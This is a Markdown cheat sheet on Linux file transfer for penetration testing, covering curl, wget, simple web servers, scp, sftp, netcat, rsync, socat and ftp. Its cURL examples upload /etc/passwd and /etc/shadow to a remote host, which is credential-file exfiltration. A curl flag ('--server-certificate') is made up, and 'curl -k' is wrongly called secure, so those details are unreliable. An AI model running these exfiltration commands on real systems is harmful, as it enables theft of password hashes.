# 🛰️ File Transfer Techniques on Linux

## Overview

This guide outlines various methods for transferring files between machines, emphasizing techniques commonly used in security assessments and penetration testing scenarios where traditional file transfer utilities may be restricted.

[!ABSTRACT] This document provides a comprehensive overview of file transfer methods including HTTP/HTTPS uploads, web servers (Python, PHP, Ruby), SCP/SFTP, Netcat, Rsync, Git, and Socat. It also covers the importance of encrypted transfers and verifying file integrity post-transfer.

---

## Basic File Transfer

### Using cURL for Uploads

**Single File:**
```bash
curl -F "file=@/etc/passwd" https://192.168.49.128/upload --insecure
```

[!WARNING] Ensure the server URL and file path are correct, as incorrect paths can lead to data loss or exposure.

**Multiple Files:**
```bash
curl -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' https://192.168.49.128/upload --insecure
```

[!CHECK] Verify that the server is configured to handle multipart form data and accepts multiple file uploads.

**With TLS Certificate:**
```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' --server-certificate ~/server.pem
```

[!WARNING] Ensure the server's certificate is correctly installed and trusted to avoid SSL handshake errors.

### Using wget for Downloads

**Single File:**
```bash
wget https://example.com/file.txt --no-check-certificate -O file.txt
```

[!SUCCESS] This command downloads `file.txt` from a remote URL, saving it locally with the same name.

**Directory Download:**
```bash
wget -r -l1 -np -nH --cut-dirs=2 https://example.com/path/to/files/ --no-check-certificate
```

[!SUCCESS] This command recursively downloads files while respecting directory structure and ignoring SSL certificate checks.

---

## Web File Transfer Methods

### Create a Web Server with Python

**Python3:**
```bash
python3 -m http.server 8000
```

**Python2.7:**
```bash
python2.7 -m SimpleHTTPServer 8000
```

[!INFO] Ensure firewall rules allow traffic on port 8000, and the web server is accessible from the target machine.

### Create a Web Server with PHP

```bash
php -S 0.0.0.0:8000
```

[!WARNING] Make sure that the PHP installation has the `cli` version enabled to start a web server.

### Ruby Web Server

```bash
ruby -run -ehttpd . -p8000
```

[!SUCCESS] This command starts an HTTP server on port 8000 using the current directory as the document root.

---

## Secure File Transfer with SSH and SFTP

### SCP Usage

**Single File:**
```bash
scp /etc/passwd user@192.168.49.128:/home/user/
```

[!SUCCESS] This command securely copies `/etc/passwd` to the remote machine at `192.168.49.128`.

**Directory:**
```bash
scp -r /tmp/scripts/ user@192.168.49.128:/home/user/
```

[!SUCCESS] This command recursively copies `/tmp/scripts` to the remote machine.

### SFTP Usage

**Interactive Session:**
```bash
sftp user@192.168.49.128
# sftp> put /file.txt
# sftp> exit
```

[!INFO] Use `put` and `get` commands to transfer files interactively.

**Batch SFTP Operations:**
```bash
echo "put /local/file.txt" > batch.txt
sftp -b batch.txt user@192.168.49.128
```

[!SUCCESS] This command executes a series of `put` commands to transfer multiple files.

---

## Netcat and Rsync File Transfer

### Netcat Usage

**Setup Listener:**
```bash
nc -l 8000 > received_file.txt
```

**Send File via Netcat:**
```bash
nc 192.168.49.128 8000 < file_to_send.txt
```

[!SUCCESS] This transfers `file_to_send.txt` to the remote machine listening on port 8000.

### Rsync Usage

**Basic Transfer:**
```bash
rsync -avz /local/path/ user@192.168.49.128:/remote/path/
```

[!SUCCESS] This command synchronizes `/local/path` to the remote machine at `192.168.49.128`.

**With SSH:**
```bash
rsync -avz -e ssh /local/path/ user@192.168.49.128:/remote/path/
```

[!SUCCESS] This securely transfers files using the `-e` option to specify `ssh`.

---

## Advanced Techniques

### Using Socat for File Transfer

**Setup Listener:**
```bash
socat TCP-LISTEN:8000,reuseaddr,fork OPEN:received_file.txt,creat
```

[!SUCCESS] This command sets up a listener on port 8000 and writes received data to `received_file.txt`.

**Send File via Socat:**
```bash
socat TCP:192.168.49.128:8000 FILE:file_to_send.txt
```

[!SUCCESS] This transfers `file_to_send.txt` to the remote machine.

### FTP Usage

**Interactive Session:**
```bash
ftp 192.168.49.128
# ftp> put local_file.txt
# ftp> get remote_file.txt
# ftp> bye
```

[!SUCCESS] This command transfers files interactively using the FTP protocol.

**Automated FTP Script:**
```bash
#!/bin/bash
ftp -n 192.168.49.128 << EOF
user anonymous test123
binary
put local_file.txt
quit
EOF
```

[!SUCCESS] This script automates FTP commands to transfer `local_file.txt`.

---

## Security Considerations

### Encrypted File Transfer

**HTTPS over HTTP:**
```bash
curl -k https://example.com/file.txt -o file.txt
```

[!SUCCESS] This command downloads a file securely using HTTPS.

**SCP/SFTP over FTP:**
```bash
scp user@host:/path/file.txt .
```

[!SUCCESS] SCP and SFTP provide encrypted transfers, ensuring data confidentiality.

### File Integrity Verification

**MD5 Checksums:**
```bash
md5sum file.txt
```

[!SUCCESS] This generates an MD5 checksum for `file.txt` to verify its integrity.

---

## References

- [cURL Manual](https://curl.se/docs/manpage.html)
- [Wget Manual](https://www.gnu.org/software/wget/manual/wget.html)
- [OpenSSH Manual](https://www.openssh.com/manual.html)
- [Netcat Guide](https://nmap.org/ncat/guide/)
- [Rsync Manual](https://rsync.samba.org/documentation.html)
- [Socat Manual](http://www.dest-unreach.org/socat/doc/socat.html)